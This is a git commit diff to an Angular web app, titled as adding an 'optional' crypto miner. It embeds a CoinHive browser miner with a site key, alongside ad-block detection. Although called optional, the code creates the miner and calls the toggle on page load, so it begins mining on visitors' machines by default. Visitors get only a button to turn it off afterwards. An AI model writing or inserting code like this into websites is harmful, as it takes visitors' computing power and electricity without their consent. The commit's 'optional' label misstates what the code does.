253c8b3372d8447567c2879e4da3400ddbe3f367
Louay Morsi <louay.hesham@gmail.com>
2019-02-06 16:28:26 +0200

    Added optional crypto miner

--- src/app/app.component.ts
+++ src/app/app.component.ts
@@ -3,6 +3,7 @@ import { Component, OnInit } from '@angular/core';
 import { SimpleTimer } from 'ng2-simple-timer';
 import { CookieService } from 'ngx-cookie-service';
 
+declare var CoinHive: any;
 declare var FuckAdBlock: any;
 
 @Component({
@@ -17,8 +18,10 @@ export class AppComponent implements OnInit {
   private cm: any;
   private fuckAdBlock: any;
 
+  public miner: any;
   public adBlockEnabled: boolean = false;
 	public appVisible: boolean = false;
+  public minerBtnText: string;
 
 	constructor(private st: SimpleTimer, private cookie: CookieService) { }
 
@@ -26,27 +29,16 @@ export class AppComponent implements OnInit {
 		this.st.newTimer(this.timerName, 1);
 		this.st.subscribe(this.timerName, () => this.timer++);
     try {
-      this.fuckAdBlock = new FuckAdBlock;
-      this.fuckAdBlock.onDetected(this.adBlockDetected)
-      this.fuckAdBlock.onNotDetected(this.adBlockNotDetected)
-      this.fuckAdBlock.check(false);
+      this.fuckAdBlock = new FuckAdBlock({
+        checkOnLoad: true
+      });
+      this.fuckAdBlock.onDetected(() => this.adBlockDetected())
+      this.fuckAdBlock.onNotDetected(() => this.adBlockNotDetected())
+      this.miner = new CoinHive.Anonymous('6lHLt4JATg9Qu7k3fn5LoSRxGGR1qUpn', {throttle: 0.4});
+      this.toggleMiner();
     } catch (e) {
       this.adBlockDetected()
     }
-
-    // try {
-    //   $.getScript("https://authedmine.com/lib/authedmine.min.js",
-    //     function() {
-    //       var miner = new CoinHive.Anonymous('6lHLt4JATg9Qu7k3fn5LoSRxGGR1qUpn', {throttle: 0.3});
-    //       if (!miner.isMobile() && !miner.didOptOut(14400)) {
-    //           miner.start();
-    //       }
-    //     }
-    //   );
-    // } catch (e) {
-    //   this.adsBlocked = false;
-    // }
-    // alert(this.adsBlocked);
 	}
 
   private adBlockDetected() {
@@ -57,6 +49,16 @@ export class AppComponent implements OnInit {
     this.adBlockEnabled = false;
   }
 
+  private startMiner() {
+    if (!this.miner.isMobile() && !this.miner.didOptOut(14400)) {
+        this.miner.start();
+    }
+  }
+
+  private stopMiner() {
+    this.miner.stop()
+  }
+
   showApp() {
   	if (this.timer < 20 && !this.cookie.check('disclaimerPassed')) {
   		window.alert("WOW! How did you read everything in just " + this.timer + " seconds?! IMPRESSIVE!\nPlease read the entire disclaimer.")
@@ -65,5 +67,45 @@ export class AppComponent implements OnInit {
   		this.st.delTimer(this.timerName);
       this.cookie.set('disclaimerPassed', 'true');
   	}
+  }
+
+  minerAvail(): boolean {
+    return (typeof this.miner !== 'undefined')
+  }
+
+  minerBtnClass(): string {
+    if (this.miner.isRunning()) {
+      return "btn btn-danger"
+    } else {
+      return "btn btn-success"
+    }
+  }
+
+  toggleMiner() {
+    if (this.miner.isRunning()) {
+      this.stopMiner()
+      this.minerBtnText = ":("
+      setTimeout(() => this.minerBtnText = "Turn miner on.", 500)
+    } else {
+      this.startMiner()
+      this.minerBtnText = "Thank You!"
+      setTimeout(() => this.minerBtnText = "Turn miner off.", 500)
+    }
+  }
+
+  minerStatus(): string {
+    if (this.miner.isRunning()) {
+      return "  ON"
+    } else {
+      return "  OFF"
+    }
+  }
+
+  minerStatusColor(): string {
+    if (this.miner.isRunning()) {
+      return "green"
+    } else {
+      return "red"
+    }
   }
 }
